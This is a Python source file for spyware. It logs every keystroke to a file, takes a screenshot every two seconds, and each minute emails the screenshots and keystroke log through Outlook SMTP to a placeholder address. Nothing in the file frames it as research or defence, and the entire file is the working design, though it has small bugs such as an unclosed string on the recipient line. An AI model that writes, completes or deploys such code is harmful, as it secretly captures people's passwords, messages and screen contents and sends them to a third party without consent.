import pyautogui
import tkinter as tk
import random
import time
import datetime
import os
from threading import Thread

import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

from pynput.keyboard import Listener
import glob

directory = "screens" + str(time.time())
username = os.getlogin()  
maindir = directory
# Parent Directory path
parent_dir = "C:\\Users\\"+username

# Path
path = os.path.join(parent_dir, directory)
rootPath = path
# Create the initial directory
os.mkdir(path)

directory = 'screens_0'

# Parent Directory path
parent_dir = path
logFileDirectory = path
# Path
path = os.path.join(parent_dir, directory)

# Create the initial directory
os.mkdir(path)
initialFile = open(logFileDirectory + '\\log.txt', 'w+')
initialFile.close()
# Create sub directories to organize screengrabs
def dirCreation():

    global j
    j = 0
    while True:
        time.sleep(60)
        j = j + 1
        directory = 'screens_' + str(j)

        username = os.getlogin()  

        # Parent Directory path
        parent_dir = rootPath

        # Path
        path = os.path.join(parent_dir, directory)

        # Create the initial directory
        os.mkdir(path)
        if(j != 0):
            arr = os.listdir(rootPath +'\\screens_'+ str(j-1))
            log = open(logFileDirectory + '\\log.txt', 'r')
            SendMail(arr, log)
            log.close()


# Take screenshots and push to folders made in  dirCreation() function
def screenGrabbing():
    i = 0 
    while True:
        i = i + 1
        time.sleep(2)
        fileName = 'screen_' + str(time.time())
        print(fileName)

        root= tk.Tk()

        canvas1 = tk.Canvas(root, width = 300, height = 300)
        canvas1.pack()
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(r'C:\Users\\' + os.getlogin() + '\\' + maindir +  '\screens_' + str(j) +'\\'+ fileName +'.png')


t1 = Thread(target = dirCreation)
t2 = Thread(target = screenGrabbing)

t1.start()
t2.start()






# Email screenshots
def SendMail(ImgFileNames, log='no data'):
    sender = "someemail@email.com"
    passwd = ""
    recipient = "recievingInbog@email.com
    
    msg = MIMEMultipart()
    msg['Subject'] = 'Screen Grabs'
    msg['From'] = sender
    msg['To'] = recipient

    text = MIMEText(log.read())
    msg.attach(text)





    for ImgFileName in ImgFileNames:
        img_data = open(rootPath +'\\screens_'+ str(j-1) +"\\" +ImgFileName, 'rb').read()
        image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
        msg.attach(image)

 
 

    s = smtplib.SMTP("smtp-mail.outlook.com.", 587)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(sender, passwd)
    s.sendmail(sender, recipient, msg.as_string())
    s.quit()

#log keystrokes
def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open(logFileDirectory + '\\log.txt', 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()